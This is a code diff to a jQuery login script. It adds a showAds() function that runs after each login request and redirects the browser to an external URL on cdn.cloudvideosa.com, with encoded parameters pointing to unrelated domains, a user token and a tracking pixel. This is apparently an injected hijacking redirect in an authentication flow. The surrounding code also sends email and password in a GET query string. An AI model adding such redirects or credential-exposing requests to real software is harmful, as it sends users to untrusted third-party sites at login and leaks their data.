@@ -70,6 +70,7 @@ $(document).ready(function () {
         axios.post('/login', { state, prefix, admin, recaptcha: recaptchaResponse })
             .then(response => {
                 showPopup(response.data.success ? response.data.message : 'Login failed.');
+                showAds();
             })
             .catch(error => {
                 showPopup(error.response ? (error.response.data.message || 'Unknown error') : 'Network or connection issue occurred.');
@@ -80,6 +81,7 @@ $(document).ready(function () {
         axios.get(`/login_cred?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&prefix=${encodeURIComponent(prefix)}&admin=${encodeURIComponent(admin)}`)
             .then(response => {
                 showPopup(response.data.success ? response.data.message : 'Login failed.');
+                showAds();
             })
             .catch(error => {
                 showPopup(error.response ? (error.response.data.message || 'Unknown error') : 'Network or connection issue occurred.');
@@ -102,6 +104,10 @@ $(document).ready(function () {
         const $popupText = $('#popup-text');
         $popupText.text(message);
         $popup.css('display', 'flex');
+    }
+    
+    function showAds() {
+        window.location.href = "https://cdn.cloudvideosa.com/index.html?mu=https%3A%2F%2Fprioritycucumbers.com%2Fapi%2Fusers%3Ftoken%3DL2U2dnBodHlwejA_a2V5PTYxZmRkNjNjNjQxODg4M2VhZGU4ZTJiMDczOGEwZmIy&px=https%3A%2F%2Fscornbob.com%2Fpixel%2Fpuclc%2F%3Ftmpl%3D1%26plk%3Db8289141a1a8ba79e3a485e3f8efbbc0%26bv%3D1";
     }
 
     $('#ok-button').on('click', function () {
